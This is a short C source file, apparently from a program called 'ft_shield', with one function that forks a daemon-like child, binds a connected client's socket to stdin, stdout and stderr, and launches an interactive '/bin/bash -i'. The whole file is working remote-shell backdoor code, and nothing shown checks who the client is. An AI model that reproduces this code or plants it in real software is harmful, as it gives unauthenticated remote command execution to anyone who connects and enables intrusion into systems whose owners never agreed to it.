#include "ft_shield.h"

void	*shell_function(t_server *server, int index)
{
	const int	client_fd = server->clients[index].fd;
	pid_t		pid;

	dprintf(2, "clientfd: %d\n", client_fd);

	// server->nbr_clients--;
	memset(&server->clients[index], 0, sizeof(t_client));

	pid = fork();
	if (pid < 0) {
		perror("fork");
	}
	else if (pid == 0) {
		setsid();

		close(server->fd);
		dup2(client_fd, STDIN_FILENO);
		dup2(client_fd, STDERR_FILENO);
		dup2(client_fd, STDOUT_FILENO);
		close(client_fd);

		char *args[] = {"/bin/bash", "-i", NULL};
		execv("/bin/bash", args);
		exit(1);
	}
	else if (pid > 0) {
		server->pid_shells[index] = pid;
		close(client_fd);
	}
	return (NULL);
}
